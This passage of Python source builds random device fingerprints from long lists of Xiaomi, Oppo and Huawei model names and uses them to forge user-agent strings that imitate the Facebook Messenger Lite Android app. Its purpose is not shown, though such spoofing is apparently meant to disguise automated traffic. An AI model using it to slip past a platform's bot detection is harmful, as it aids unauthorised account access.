'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'M2007J1SC', 'M2007J1SC', 'M2007J1SC', 'M2007J17I', 'M2007J17I', 'M2102J2SC', 'M2102J2SC', 'M2102J2SC', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'M2007J3SY', 'M2007J3SC', 'M2007J3SP', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'M2007J17G', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'M2007J3SG', 'M2011K2G', 'M2011K2C', 'Mi 11', 'Mi 11', 'M2011K2C', 'M2011K2C', 'M2101K9AG', 'M2101K9AG', 'Mi 11 Lite', '2109119DG', 'M2101K9G', 'M2101K9C', '2109119DI', 'M2102K1AC', 'M2102K1AC', 'M2102K1AC', 'M2102K1AC', 'Mi 11 Pro', 'Mi 11 Pro', 'M2102K1C', 'M2102K1C', 'M2102K1C', 'M2102K1G', 'Mi 11 Ultra', 'M2012K11G', 'Mi 11i', '21081111RG', '2107113SG', '2107113SI', 'M2012K11AI', 'M2012K11I', 'M2012K11I', 'MI 1S', 'MI 1S', 'MI 1S', 'MI 2', 'MI 2', 'MI 2A', 'MI 2A', 'MI 2A', 'MI 2A', 'MI 2A', 'MI 2S', 'MI 2S', 'MI 2S', 'MI 2S', 'MI 2SC', 'MI 2SC', 'MI 2SC', 'MI 2SC', 'MI 3', 'MI 3', 'MI 3', 'MI 30 Pro', 'MI 3C', 'MI 3C', 'MI 3C', 'MI 3W', 'MI 3W', 'MI 3W', 'Mi 4', 'MI 4', 'MI 4LTE', 'MI 4LTE', 'MI 4LTE', 'MI 4LTE', 'Mi-4c', 'Mi-4c', 'Mi-4c', 'Mi-4c', 'Mi 4i', 'Mi 4i', 'Mi 4i', 'Mi 4i', 'MI 4S', 'MI 4S', 'arm_64 MI 4S', 'MI 4S', 'MI 4W', 'MI 4W', 'MI 4W', 'MI 4W', 'MI 5', 'Mi 5', 'MI 5', 'MI 5', 'Mi 5C', 'Mi 5c', 'MI 5C', 'MI 5s', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5X Flow', 'MI 5X', 'MI 5X', 'Mi 5X', 'MI 5X', 'MI 6', 'MI 6', 'MI 6', 'MI 6X', 'MI 6X', 'MI 6X', 'MI 6X', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8 Lite', 'MI 8 Lite', 'MI 8 Lite', 'MI 8 Pro', 'MI 8 Pro', 'MI 8 Pro', 'MI 8 SE', 'MI 8 SE', 'MI 8 SE', 'MI 8 SE', 'MI 8 UD', 'MI 8 UD', 'MI 8 UD', 'MI 8 UD', 'MI 9', 'MI 9', 'MI 9', 'MI 9', 'MI 9', 'MI 9', 'Mi 9 Lite', 'Mi9 Pro 5G', 'Mi 9 Pro 5G', 'MI 9 ROY', 'MI 9 SE', 'MI 9 SE', 'Mi 9 SE', 'Mi 9T', 'Mi 9T Pro', 'Mi 9X', 'Mi A1', 'mi a13', 'Mi A2', 'Mi A2 Lite', 'Mi A3', 'Mi A3', 'MI A615FN', 'MiBOX2', 'MIBOX3', 'MiBOX3_PRO', 'MIBOX4', 'Mi CC 9', 'MI CC 9', 'MI CC 9', 'MI CC9 Pro', 'Mi CC9 Pro', 'MI CC9 Pro', 'MI CC9 Pro', 'MI CC 9e', 'MI CC 9e', 'MI CC 9e', 'MI CC 9e', 'MiProjA1', 'MI MAX', 'MI MAX', 'MI MAX', 'MI MAX', 'Mi Max', 'MI MAX', 'MI MAX 2', 'XIAOMI MI MAX 2', 'MI MAX 2', 'MI MAX 2', 'Mi Max 2', 'MI MAX 3', 'MI MAX 3', 'Mi Max 3', 'MIX', 'MIX', 'MIX Lite', 'MIX', 'Mix Plus', 'MIX 2', 'MIX 2', 'MIX 2', 'Mi MIX 2', 'MIX 2', 'Mi MIX 2S', 'MIX 2S', 'MIX 2S', 'MIX 2S', 'MIX 2S', 'Mi MIX 2S', 'Mi MIX 3', 'MIX 3', 'Mi MIX 3 5G', 'Mi MIX 3 5G', 'Mi MIX 3 5G', 'Mi MIX 3 5G', 'Mi MIX 3 5G', '2106118C', '2106118C', 'M2011J18C', 'M2011J18C', 'M2011J18C', 'M2011J18C', 'Mi Note 10', 'Mi Note 10 Lite', 'Mi Note 10 Pro', 'Mi Note 11', 'Mi Note 2', 'MI Note 2', 'Mi Note 2', 'Mi Note 2', 'Mi Note 2', 'Mi Note 2', 'Mi Note 3', 'Mi Note 8 Pro', 'MI NOTE LTE', 'MI NOTE LTE', 'MI NOTE LTE', 'MI NOTE LTE', 'MI NOTE Pro', 'Mi Note Pro', 'MI NOTE Pro', 'MI NOTE Pro', 'MI NOTE Pro', 'Mi Note10 Pro', 'Mi Note5', 'MI-ONE', 'MI-ONE C1', 'MI-ONEPlus', 'MI-ONE Plus', 'Mi Pad 4Plus', 'MI PAD', 'MI PAD 2', 'MI PAD 2', 'MiPad 3', 'MI PAD 3', 'MI PAD 4', 'MI PAD 4 PLUS', 'MI PAD 4 PLUS', 'Xiaomi Pad 5', 'Xiaomi Pad 5', '21051182G', '21051182C', 'Xiaomi Pad 5', 'M2105K81AC', 'M2105K81AC', 'M2105K81AC', '22081281AC', 'M2105K81C', 'M2105K81C', 'Mi Pad4 Wi-Fi', 'Mi Pad5 Wi-Fi', 'MI PLAY', 'MI PLAY Flow', 'MI PLAY', 'MI PLAY', 'MI PLAY', 'MI XL', 'Xiaomi Mi5', 'MiTV-AXSO0', 'MiTV4A', 'MiTV4-ANSM0', 'MiTV-MSSP0', 'MiTV-AXSO1', 'MiTV-AXSO2', 'MiTV4C', 'MiTV4I', 'MiTV4I', 'MiTV-MSSP2', 'MiTV-MSSP1', 'MiTV-MSSP3', 'MiTV-MOOQ0', 'MiTV-MOOQ0', 'MiTV-MTEQ0', 'MiTV-AESP0', 'MiTV-AYFR0', 'MiTV-ANSP0', 'MiTV-ANSP0', '22061218C', '22061218C', '22061218C', '22061218C', '22061218C', '2209116AG', 'POCOPHONE F1', 'POCO F1', 'Qin 1s+', 'Qin 2', 'QIN2 Pro', 'Qin 2 Pro', 'Redmi 01A', 'HM 1', '21061119DG', '220333QBI', 'Redmi 10', 'Redmi 10', '21061119AG', '21121119SG', '22011119UY', '22041219NY', '22041219G', 'Redmi 10 5G', '21061119BI', '22011119TI', '22041219I', '220233L2G', '220233L2I', '220333QNY', '220333QAG', '220333QL', 'Redmi 10I', 'Redmi 10S', 'M2004J7AC', 'M2004J7AC', 'M2004J7AC', 'M2004J15SC', 'M2004J7BC', 'M2004J7BC', 'M2004J7BC', 'Redmi 11 Lite', 'Redmi 11 lite', '22071219AI', '22071219AI', 'Redmi 11X', 'Redmi 12 5G', 'Redmi 12', '22120RN86G', '22126RN91Y', 'Redmi 12C', '2212ARNC4L', 'Redmi 12C', 'HM 1S', 'HM 1SW', 'Redmi 1S', 'HM 1SW', 'HM 1SC', 'HM 1S', 'HM 1S', 'HM 1S', 'HM 1S', 'HM 1SW', 'wt88047', 'Redmi 2', 'Redmi 2 Prime', 'wt88047', 'wt88047', 'HM 2A', 'HM 2A', 'HM 2A', 'Redmi 3', 'Redmi 3', 'Redmi 3', 'Redmi 3', 'Redmi 3S', 'Redmi 3S', 'Redmi 3S', 'Redmi 3X', 'Redmi 3X', 'Redmi 3X', 'Redmi 3X', 'Redmi 4', 'Redmi 4 Prime', 'Redmi 4 Pro', 'Redmi 4 Pro', 'Redmi 41224', 'Redmi 4A', 'Redmi 4A', 'Redmi 4A', 'Redmi 4A', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5 Plus', 'Redmi 5 Plus', 'Redmi 5 pro', 'Redmi 5A', 'Redmi 5pro', 'Redmi 5S', 'Redmi 6', 'Redmi 6', 'Redmi 6', 'Redmi 6 Pro', 'Redmi 6 Pro', 'Redmi 6A', 'Redmi 7', 'Redmi 7 Pro', 'Redmi 7A', 'Redmi 7A', 'Redmi 7I', 'Redmi 7i', 'Redmi 8', 'Redmi 85781', 'Redmi 8A', 'Redmi 8A Dual', 'Redmi 8A Pro', 'Redmi 8A Pro', 'Redmi 8A Pro', 'Redmi 8A Pro', 'M2004J19C', 'M2010J19SI', 'Redmi 9 Power', 'Redmi 9 Prime', 'Redmi 9 Prime', 'Redmi 9 Pro', 'Redmi 99070', 'M2006C3LG', 'M2006C3LI', 'M2006C3LVG', 'M2006C3MG', 'M2006C3MT', 'M2006C3MNG', 'M2006C3LII', 'Redmi 9i', 'Redmi 9Prime', 'Redmi 9pro', 'M2010J19SY', 'M2010J19SG', 'M2010J19SL', 'Redmi 9T NFC', '220733SG', '220733SL', '220733SFG', '23028RN4DG', '23028RNCAG', 'Redmi A3', 'Redmi A8', 'Redmi A90', 'Redmi Go', 'Redmi K20', 'Redmi K20', 'Redmi K20 Pro', 'Redmi K20 Pro', 'Redmi K20 Pro', 'Redmi K20 Pro', 'Redmi K30', 'Redmi K30', 'Redmi K30', 'Redmi K30', 'Redmi K30', 'Redmi K30 5G', 'Redmi K30 5G', 'Redmi K30 5G', 'Redmi K30 5G', 'Redmi K30 Pro', 'Redmi K30 Pro', 'M2006J10C', 'M2006J10C', 'M2006J10C', 'M2006J10C', 'Redmi K30i 5G', 'Redmi K30i 5G', 'Redmi K30i 5G', 'Redmi K30i 5G', 'M2012K11AC', 'M2012K11AC', 'M2012K11AC', 'M2012K10C', 'M2012K10C', 'M2012K10C', 'M2012K11C', 'M2012K11C', 'M2012K11C', '22021211RC', '22021211RC', '22041211AC', '22041211AC', '22041211AC', '22041211AC', '22041211AC', '22011211C', '22011211C', '22011211C', '21121210C', '21121210C', '21121210C', '21121210C', '22041216I', '23013RK75C', '23013RK75C', 'Redmi K60', '22127RK46C', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'M2101K7AG', 'M2101K7AI', 'M2103K19G', 'M2103K19C', 'XIG02', 'M2101K6G', 'M2104K10AC', 'M2101K6R', 'M2101K7BG', 'M2101K7BNY', 'M2101K7BL', 'M2101K7BI', '22021119KR', 'M2103K19Y', 'Redmi Note 10T', 'M2103K19I', 'A101XM', 'M2003J15SC', 'M2003J15SC', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', '2201117TY', '2201117TG', '2201117TI', '2201117TL', '21091116AC', '21091116AC', '21091116AC', '2201116TG', '21091116C', '2201116TI', '2201116TG', '21091116C', '2201116SG', '2201116SR', '21091116UG', '21091116UC', '2201116SI', '22087RA4DI', '22087RA4DI', '22041219C', '22041219C', 'Redmi Note 11E', '2201116SC', 'Redmi Note 11R', 'Redmi Note 11R', '22095RA98C', '2201117SL', '2201117SY', '2201117SI', '2201117SG', '22031116BG', '21091116I', '21091116AI', '22041216C', '22041216C', '22041216C', '22041216C', '22041216C', '22041216UC', '22041216UC', '22041216UC', '22111317G', '23021RAAEG', '23021RAA2Y', 'Redmi Note 12', 'Redmi Note 12', 'Redmi Note 12', '22101316UP', '22101316G', '22101316I', '22101316C', '22101316C', '22101316UC', '22101316UCP', '22101316UCP', '22101316UCP', '22101316UCP', '22101316UG', '2303CRA44A', 'Redmi Note 12S', '23030RAC7Y', 'Redmi Note 12S', 'Redmi Note 12S', 'Redmi Note 12S', '23049RAD8C', '23049RAD8C', '23049RAD8C', 'Redmi Note 13', 'Redmi Note 1LTE', 'Redmi Note 2', 'Redmi Note 2', 'Redmi Note 27', 'Redmi Note 3', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4', 'Redmi Note 4', 'Redmi Note 4A', 'HM NOTE 1S', 'HM NOTE 1S', 'HM NOTE 1S', 'HM NOTE 1LTE', 'HM NOTE 1LTEW', 'HM NOTE 1LTE', 'HM NOTE 1LTEW', 'HM NOTE 1LTE', 'HM NOTE 1LTE', 'HM NOTE 1LTE', 'HM NOTE 1LTEW', 'Redmi Note 4X', 'Redmi Note 4X', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5', 'Redmi Note 5', 'Redmi Note 5', 'Redmi Note 5A', 'Redmi note 6', 'redmi note 6', 'Redmi Note 6Pro', 'Redmi Note 7', 'Redmi Note 7', 'Redmi Note 7S', 'Redmi Note 7S', 'M1901F71', 'Redmi Note 7S', 'Redmi Note 8', 'Redmi Note 8', 'M1908C3JGG', 'M1908C3JGG', 'Redmi Note 8T', 'Redmi Note 9', 'M2010J19SC', 'M2010J19SC', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'M2007J22C', 'M2007J22C', 'M2007J22C', 'M2007J22C', 'M2007J17C', 'M2007J17C', 'M2007J17C', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'M2007J22G', 'A001XM', 'Redmi Note10 JE', 'Redmi Note7', 'Redmi Note8', 'Redmi Note8T', '22081283G', '22081283C', 'Redmi Pad', 'Redmi Pro', 'Redmi Pro', 'Redmi Pro', 'Redmi Pro', 'Redmi Pro', 'Redmi S2', 'Redmi S2', 'Redmi S2', 'Redmi S2', 'Redmi X', 'Redmi Y1', 'Redmi Y1', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y1 Lite', 'Redmi Y1 Lite', 'Redmi Y2', 'Redmi Y3', 'Redmi Y3'])
                self.useragent = (f'Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.android_model} Build/{self.android_build}) [FBAN/MessengerLite;FBAV/{self.app_version};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{random.randint(00000000, 99999999)};FBCR/INDOSAT;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/{self.android_model};FBSV/9;FBCA/{self.arm64}:null;FBDM/' + '{' + str(self.density) + '};]')
            elif "Oppo" in str(self.device):
                self.android_model = random.choice(['OPPO 1105', 'oppo 15', 'Oppo 3T', 'Oppo 62A', 'oppo6779', 'oppo6833', 'OPPO7273', 'Oppo 9A', 'Oppo A1', 'PHQ110', 'PHQ110', 'PCHM10', 'PCHM10', 'PCHM10', 'PCHM10', 'CPH2071', 'PCHT30', 'PCHM00', 'CPH2083', 'CPH2083', 'CPH2083', 'CPH2185', 'CPH2179', 'CPH2269', 'CPH2421', 'CPH2349', 'CPH2271', 'CPH2477', 'CPH2471', 'CPH2471', 'CPH1923', 'CPH1923', 'CPH1923', 'CPH1923', 'CPH1925', 'oppo A25', 'CPH1837', 'PADT00', 'PADM00', 'CPH1837', 'PADM00', 'OPPO A30', 'OPPO A30', 'OPPO A30', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'OB-OPPO A31c', 'PDVM00', 'PDVM00', 'PDVM00', 'PDVM00', 'CPH2137', 'OPPO A33', 'OPPO A33m', 'OPPO A33t', 'OPPO A34', 'Oppo A34', 'PEFM00', 'PEFM00', 'PEFM00', 'PEFM00', 'PESM10', 'PESM10', 'PESM10', 'PESM10', 'OPPO A36', 'OPPO A37m', 'OPPO A37f', 'A37fw', 'OPPO A37t', 'OPPO A37t', 'OPPO A38', 'CPH1605', 'CPH1605', 'CPH1803', 'OPPO CPH1803', 'OPPO CPH1803', 'OPPO PBBM30', 'CPH1803', 'CPH1853', 'Oppo A4', 'OPPO A40', 'Oppo A400', 'OPPO A41', 'OPPO A42', 'OPPO A43', 'Oppo A43', 'OPPO A44', 'OPPO A45', 'Oppo A45', 'OPPO A46', 'OPPO A47', 'OPPO A48', 'OPPO A49', 'OPPO PBBT30', 'PBAM00', 'CPH1809', 'OPPO PBAT00', 'OPPO PBAM00', 'PBAM00', 'CPH1809', 'CPH1809', 'OPPO PBAM00', 'PBAT00', 'CPH1931', 'CPH1933', 'OPPO A50', 'OPPO A51', 'oppo A51', 'CPH2069', 'CPH2061', 'CPH2061', 'CPH2127', 'CPH2139', 'PECM20', 'PECT30', 'PECM30', 'PECM30', 'OPPO A53m', 'OPPO A53m', 'OPPO A53m', 'CPH2135', 'CPH2321', 'CPH2239', 'CPH2239', 'CPH2195', 'OPG02', 'CPH2273', 'CPH2325', 'PEMT20', 'PEMM20', 'PEMT00', 'PEMM00', 'PEMM00', 'PEMM20', 'PEMM00', 'PEMM20', 'A102OP', 'CPH2309', 'OPPO A56', 'PFVM10', 'PFVM10', 'CPH2407', 'OPPO A57', 'CPH1701', 'OPPO A57', 'CPH1701', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'CPH2387', 'PHJ110', 'PHJ110', 'PHJ110', 'PHJ110', 'PHJ110', 'OPPO A59', 'OPPO A59m', 'OPPO A59m', 'OPPO A59s', 'OPPO A59S', 'OPPO A59s', 'OPPO A59st', 'OPPO A59t', 'CPH1909', 'CPH1901', 'OPPO PBFT00', 'OPPO PBFM00', 'CPH1717', 'CPH1801', 'CPH1801', 'Oppo A71A', 'CPH2067', 'PDYM20', 'PDYM10', 'PDYT10', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'CPH2161', 'CPH2099', 'OPPO A73t', 'OPPO A73t', 'OPPO A73t', 'CPH2219', 'OPPO CPH2219', 'CPH2197', 'CPH2263', 'CPH2375', 'CPH1715', 'OPPO A77', 'CPH2339', 'CPH2385', 'CPH2473', 'OPPO A77t', 'OPPO A77t', 'OPPO A77t', 'OPPO A77t', 'CPH2483', 'OPPO A79', 'OPPO A79', 'OPPO A79kt', 'OPPO A79', 'OPPO A79k', 'OPPO A79k', 'OPPO A79t', 'OPPO A79t', 'OPPO A79t', 'OPPO A79t', 'PCDM00', 'OPPO PCDM00', 'PCDM00', 'PCDM00', 'PCDT00', 'PBBM00', 'PBBM00', 'PBBM00', 'PBBT00', 'PDBM00', 'PDBM00', 'PDBM00', 'PDBM00', 'OPPO A83', 'CPH1729', 'OPPO A83', 'CPH1827', 'CPH1827', 'OPPO A83t', 'OPPO A83t', 'OPPO A83t', 'PCAM10', 'PCAM10', 'PCAM10', 'CPH1938', 'PCAT10', 'PCAM10', 'CPH1938', 'CPH1937', 'CPH1941', 'CPH2001', 'CPH2021', 'PCPM00', 'CPH2001', 'CPH2001', 'CPH2001', 'CPH2001', 'CPH2059', 'PDKT00', 'PDKM00', 'PDKT00', 'PDKT00', 'PDKM00', 'CPH2121', 'PEHM00', 'CPH2123', 'PFGM00', 'PFGM00', 'PFGM00', 'CPH2203', 'CPH2333', 'CPH2365', 'PHA120', 'PHA120', 'OPPO A96', 'PFUM10', 'PFUM10', 'PFUM10', 'PFTM10', 'PFTM10', 'Oppo A98', 'PCEM00', 'PCEM00', 'PCET00', 'CPH1851', 'CPH1920', 'CPH1903', 'A1603', 'OPPOCNM632', 'CPH1114', 'CPH1235', 'CPH1451', 'CPH1615', 'CPH1664', 'CPH1869', 'CPH1869', 'CPH1929', 'CPH1985', 'CPH2048', 'CPH2048', 'CPH2048', 'CPH2107', 'CPH2238', 'CPH2332', 'CPH2351', 'CPH2389', 'CPH2419', 'CPH2451', 'CPH2465', 'CPH2467', 'CPH2529', 'CPH2531', 'CPH2531', 'CPH2589', 'CPH2643', 'CPH3475', 'CPH3669', 'CPH3682', 'CPH3731', 'CPH3776', 'CPH3785', 'CPH4125', 'CPH4275', 'CPH4299', 'CPH4395', 'CPH4473', 'CPH4987', 'CPH5286', 'CPH5841', 'CPH5947', 'CPH6178', 'CPH6244', 'CPH6271', 'CPH6316', 'CPH6519', 'CPH6528', 'CPH6697', 'CPH7338', 'CPH7364', 'CPH7382', 'CPH7532', 'CPH7577', 'CPH7991', 'CPH8153', 'CPH8346', 'CPH8347', 'CPH8363', 'CPH8393', 'CPH8467', 'CPH8472', 'CPH8534', 'CPH8686', 'CPH8893', 'CPH9177', 'CPH9226', 'CPH9659', 'CPH9667', 'CPH9716', 'CPH9763', 'CPH9929', 'oppo f 5 plus', 'OPPO F1 Plus', 'Oppo F1', 'Oppo F1', 'X9009', 'OPPO R9m', 'X9009', 'Oppo F10', 'CPH1911', 'CPH1969', 'Oppo F11Pro', 'CPH2095', 'CPH2119', 'OPPO F19', 'Oppo F19', 'CPH2285', 'CPH2285', 'CPH2213', 'CPH2213', 'CPH2223', 'A1601', 'OPPO F1s', 'OPPO F1s', 'A1601', 'CPH2341', 'CPH2461', 'CPH2455', 'CPH2461', 'CPH2455', 'CPH2527', 'CPH1609', 'CPH1609', 'CPH1609', 'CPH1613', 'CPH1727', 'CPH1723', 'CPH1727', 'CPH1723', 'CPH1723', 'CPH1725', 'CPH1725', 'Oppo F51', 'Oppo F61 Pro', 'CPH1819', 'CPH1821', 'CPH1819 Flow', 'CPH1881', 'CPH1825', 'CPH1825', 'CPH1881', 'CPH1881', 'CPH1825', 'CPH1881', 'CPH1823', 'X909', 'X909', 'R827T', 'R827T', 'R827', 'X9076', 'X9077', 'X9070', 'X9077', 'X9076', 'X9077', 'X9006', 'X9007', 'X9000', 'X9007', 'X9006', 'X9006', 'R815W', 'R815T', 'R815', 'R8111', 'OPPOR8111', 'R821T', 'R821', 'R821', 'PEUM00', 'PEUM00', 'PEUM00', 'PEUM00', 'PGU110', 'PGU110', 'CPH2437', 'PGT110', 'U707T', 'PAFM00', 'CPH1875', 'PAFT00', 'CPH1871', 'PAHM00', 'PAHM00', 'PAHM00', 'PAHM00', 'CPH2023', 'PDEM10', 'CPH2005', 'CPH2025', 'Find X2 Pro', 'PDEM30', 'PEDM00', 'PEDM00', 'Find X3 Neo', 'CPH2173', 'OPG03', 'PEEM00', 'CPH2307', 'PFFM10', 'CPH2305', 'PFEM10', 'OPPOJLAJH6', 'R1011', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCT10', 'CPH2373', 'PGJM10', 'CPH2337', 'PGIM10', 'PGGM10', 'PGGM10', 'CPH1955', 'PCNM00', 'PCNM00', 'PCNM00', 'PCLM50', 'PCLM50', 'PCLM50', 'PERM00', 'PERM00', 'PERM00', 'PEXM00', 'PEXM00', 'PEXM00', 'PEYM00', 'PEYM00', 'PEYM00', 'PERM10', 'PERM10', 'PGCM10', 'PGCM10', 'PGCM10', 'N5117', 'N5117', 'N5117', 'N1T', 'N1T', 'N5209', 'N5207', 'N5207', 'R831T', 'R831T', 'R831', 'Oppo Neo 7', 'R831K', 'R831K', 'R831K', '1201', 'A33w', 'A33f', 'A33fw', 'OPD2102A', 'OPD2101', 'OPPO R10', 'R1001', 'OPPO R11', 'OPPO R11t', 'OPPO R11t', 'OPPO R11t', 'OPPO R11t', 'OPPO R11', 'OPPO R11 Plusk', 'OPPO R11 Plus', 'OPPO R11 Plus', 'OPPO R11 Pluskt', 'OPPO R11plus', 'OPPO R11s', 'OPPO R11s', 'OPPO R11st', 'OPPO R11s', 'CPH1719', 'OPPO R11st', 'OPPO R11s', 'OPPO R11s', 'CPH1721', 'OPPO R11s Plus', 'OPPO R11s Plust', 'PAAM00', 'PACM00', 'PACM00', 'PACT00', 'CPH1835', 'PAAM00', 'CPH1831', 'PBCM10', 'PBCM10', 'PBCM10', 'PBCM10', 'PBCM10', 'PBEM00', 'CPH1879', 'PBET00', 'PBEM00', 'CPH1893', 'CPH1893', 'CPH1893', 'CPH1893', 'CPH1877', 'PBDM00', 'PBDT00', 'R8001', 'R8006', 'R8006', 'R8007', 'R8000', 'R8007', 'R8007', 'R8200', 'R8201', 'R8200', 'R8206', 'R2001', 'R2010', 'R2017', 'R2017', 'R8107', 'R8109', 'R8106', 'R8107', 'Oppo R53', 'R6007', 'R7g', 'OPPO R7', 'R7f', 'OPPO R7', 'OPPO R7', 'R7kf', 'R7Plus', 'R7Plusm', 'R7Plus', 'R7Plust', 'R7Plusm', 'R7Plust', 'R7Plusm', 'R7plusf', 'R7005', 'R7007', 'R7007', 'R7sf', 'OPPO R7s', 'OPPO R7sPlus', 'OPPO R7sPlus', 'OPPO R7sm', 'OPPO R7sm', 'oppo r7sm', 'OPPO R7sm', 'OPPO R7sm', 'OPPO R7st', 'OPPO R7t', 'OPPO R7t', 'R801', 'R805', 'OPPOR805', 'R811', 'R819', 'R819T', 'R819T', 'R819T', 'R8205', 'R8207', 'R8207', 'R8207', 'R823T', 'R829', 'R829T', 'R830', 'R830S', 'R833T', 'OPPO R9 Plusm A', 'OPPO R9 Plustm A', 'OPPO R9 Plusm A', 'OPPO R9 Plusm A', 'OPPO R9 Plusm A', 'OPPO R9 Plustm A', 'X9079', 'OPPO R9km', 'OPPO R9km', 'OPPO R9km', 'OPPO R9sk', 'OPPO R9sk', 'CPH1607', 'OPPO R9st', 'CPH1611', 'OPPO R9s Plus', 'OPPO R9t', 'OPPO R9t', 'OPPO R9tm', 'OPPO R9tm', 'OPPO R9tm', 'OPPO R9tm', 'CPH1917', 'PCAM00', 'PCAM00', 'PCAM00', 'PCAT00', 'PCCT00', 'PCCT00', 'CPH1919', 'PCCM00', 'CPH1907', 'CPH1907', 'CPH1907', 'CPH1907', 'PCKM00', 'CPH1907', 'CPH1989', 'CPH1989', 'CPH1951', 'CPH1945', 'CPH1945', 'CPH2043', 'CPH2043', 'PDCM00', 'A001OP', 'PDCM00', 'PDCM00', 'PCRT01', 'PCRT01', 'CPH2009', 'CPH2035', 'CPH2037', 'CPH2013', 'A002OP', 'CPH2113', 'CPH2091', 'PDPM00', 'PDPT00', 'CPH2125', 'CPH2109', 'CPH2109', 'PDNM00', 'CPH2089', 'PDNM00', 'PDNT00', 'PEAT00', 'PEAM00', 'PEAM00', 'CPH2209', 'CPH2065', 'CPH2159', 'CPH2159', 'CPH2145', 'PEGM00', 'CPH2205', 'CPH2207', 'PDSM00', 'CPH2201', 'PDST00', 'PDSM00', 'PDRM00', 'PDRM00', 'PDRM00', 'PDRM00', 'PDRM00', 'CPH2199', 'A101OP', 'A103OP', 'CPH2217', 'CPH1921', 'PEGM10', 'PEGT10', 'PEGT10', 'PEGM10', 'PEGT10', 'CPH2211', 'CPH2235', 'CPH2251', 'PEQM00', 'PEPM00', 'PEPM00', 'CPH2247', 'CPH2249', 'PENM00', 'PENM00', 'PENM00', 'PENM00', 'CPH2237', 'CPH2237', 'CPH2371', 'CPH2363', 'CPH2293', 'PFDM00', 'PFCM00', 'PFCM00', 'PFCM00', 'A201OP', 'CPH2353', 'OPG04', 'CPH2343', 'PGBM10', 'PGBM10', 'PGBM10', 'CPH2357', 'CPH2359', 'PFZM10', 'CPH2457', 'CPH2481', 'CPH2505', 'PHM110', 'PHM110', 'PHM110', 'PHM110', 'PGX110', 'PGX110', 'PGX110', 'PGW110', 'PGW110', 'PGW110', 'CPH1983', 'CPH1983', 'PCLM10', 'PCLM10', 'PCLM10', 'PCLM10', 'PDHM00', 'arm_64 PDHM00', 'PDHM00', 'PCGM00', 'PCGM00', 'PCGM00', 'PCGM00', 'CPH1979', 'PCDM10', 'CPH1979', 'Oppo Reno2 /MMB29M', 'OPPO Reno5 Pro Plus', 'Oppo S1', 'Oppo S17', 'Oppo S4', 'OPPOT29', 'U705T', 'U705T', 'Oppo V5', 'OW20W1', 'OW19W2', 'OW19W3', 'OW19W1', 'oppo x', 'Oppo X', 'OPPO x20 70816.012', 'OPPO x22 6.012', 'OPPOX9017', 'OPPOX907', 'OPPOX907', 'Oppo Y15', 'Oppo Y21', 'Oppo Y3', 'Oppo Z1'])
                self.useragent = (f'Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.android_model} Build/{self.android_build}) [FBAN/MessengerLite;FBAV/{self.app_version};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{random.randint(00000000, 99999999)};FBCR/INDOSAT;FBMF/Oppo;FBBD/Oppo;FBDV/{self.android_model};FBSV/9;FBCA/{self.arm64}:null;FBDM/' + '{' + str(self.density) + '};]')
            elif "Huawei" in str(self.device):
                self.android_model = random.choice(['POT-AL00a', 'POT-TL00a', 'POT-AL00a', 'POT-AL00a', 'POT-AL00a', 'POT-AL00a', 'Huawei Ascend', 'U9500', 'U9500', 'U9500', 'U9500', 'U9500', 'U8818', 'HUAWEI U8818', 'HUAWEI U8818', 'HUAWEI U8818', 'U8818', 'U8818', 'U8818', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'G527-U081', 'HUAWEI G6-L11', 'G620S-L01', 'C8817D', 'G620S-L03', 'G620S-L01', 'C8817D', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G630-U251', 'G7-L01', 'HUAWEI G7-L01', 'Huawei G700', 'HUAWEI G700-U20', 'HUAWEI G700-T00', 'HUAWEI G700-U10', 'Huawei g700', 'HUAWEI G700-U00', 'HUAWEI G700-T00', 'HUAWEI G700-U20', 'HUAWEI G700-U10', 'HUAWEI 